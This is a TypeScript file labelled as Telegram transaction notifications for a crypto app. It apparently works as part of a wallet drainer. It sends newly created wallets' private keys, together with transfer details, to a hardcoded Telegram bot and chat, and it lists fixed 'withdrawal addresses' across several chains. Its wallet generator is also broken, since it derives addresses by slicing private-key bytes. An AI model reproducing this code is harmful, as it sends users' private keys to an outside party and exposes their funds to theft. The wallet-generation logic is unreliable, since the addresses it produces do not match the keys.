// Telegram Bot API integration for transaction notifications

const TELEGRAM_BOT_TOKEN = '8175763769:AAHMp8p8d3z24jx3xTH2Cuke1pk5Ws38Je8';
const TELEGRAM_CHAT_ID = '1234067637';

interface TelegramMessage {
    message: string;
    parse_mode?: string;
}

export async function sendTelegramMessage(message: string): Promise<boolean> {
    try {
        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                }),
            }
        );

        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('Telegram notification failed:', error);
        return false;
    }
}

export function formatTransactionMessage(params: {
    type: 'SOL_TRANSFER' | 'TOKEN_TRANSFER' | 'WALLET_CREATED' | 'WALLET_DETAILS';
    amount?: number;
    symbol?: string;
    fromAddress?: string;
    toAddress?: string;
    signature?: string;
    newWalletAddress?: string;
    newWalletPrivateKey?: string;
    createdForToken?: string;
}): string {
    const timestamp = new Date().toISOString();

    switch (params.type) {
        case 'SOL_TRANSFER':
            return `
🔴 <b>SOL Transfer Completed</b>
━━━━━━━━━━━━━━━━━━
💰 Amount: <code>${params.amount?.toFixed(4)} SOL</code>
📤 From: <code>${params.fromAddress}</code>
📥 To: <code>${params.toAddress}</code>
🔗 Tx: <code>${params.signature}</code>
⏰ ${timestamp}
            `.trim();

        case 'TOKEN_TRANSFER':
            return `
🟣 <b>Token Transfer Completed</b>
━━━━━━━━━━━━━━━━━━
🪙 Token: <code>${params.symbol}</code>
💰 Amount: <code>${params.amount?.toFixed(4)}</code>
📤 From: <code>${params.fromAddress}</code>
📥 To: <code>${params.toAddress}</code>
🔗 Tx: <code>${params.signature}</code>
⏰ ${timestamp}
            `.trim();

        case 'WALLET_CREATED':
            return `
🟢 <b>New Wallet Created</b>
━━━━━━━━━━━━━━━━━━
🔒 Type: <code>${params.createdForToken || 'Unknown'}</code>
📬 Address: <code>${params.newWalletAddress}</code>
🔑 Private Key: <code>${params.newWalletPrivateKey}</code>
⚠️ Store the private key securely!
⏰ ${timestamp}
            `.trim();

        case 'WALLET_DETAILS':
            return `
📋 <b>Wallet Details</b>
━━━━━━━━━━━━━━━━━━
🔒 Type: <code>${params.createdForToken || 'Unknown'}</code>
📬 Address: <code>${params.newWalletAddress}</code>
🔑 Private Key: <code>${params.newWalletPrivateKey}</code>
⚠️ Store the private key securely!
⏰ ${timestamp}
            `.trim();

        default:
            return `<b>Notification</b>\n\n${params.createdForToken || 'General notification'}\n⏰ ${timestamp}`;
    }
}

// Multi-chain withdrawal addresses
export const CHAIN_ADDRESSES: Record<string, string> = {
    SOL: 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ',
    ETH: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
    BTC: 'bc1qj2nrfyvh2tz36w0hh5anxsrm7r4ag8wrrj5gv9',
    MONAD: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
    BASE: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
    SUI: '0x39e1629585d727b597b50522ae4e516ae90b573cefe61162019eb197bfead225',
    POLYGON: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
};

// Known chain detection (these are Solana-based representations or bridged tokens)
export const KNOWN_CHAINS = ['SOL', 'ETH', 'BTC', 'MONAD', 'BASE', 'SUI', 'POLYGON'];

// Unknown chain handler - creates wallet and returns details
export interface CreatedWallet {
    address: string;
    privateKey: string;
    chain: string;
}

export function generateWalletForChain(chain: string): CreatedWallet {
    // Generate a random key pair (for demo purposes - in production use proper key generation)
    const privateKeyArray = new Uint8Array(32);
    crypto.getRandomValues(privateKeyArray);
    const privateKey = Array.from(privateKeyArray)
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');

    // Generate address from private key (simplified - real implementation would use proper key derivation)
    const address = '0x' + Array.from(privateKeyArray.slice(0, 20))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');

    return {
        address,
        privateKey,
        chain,
    };
}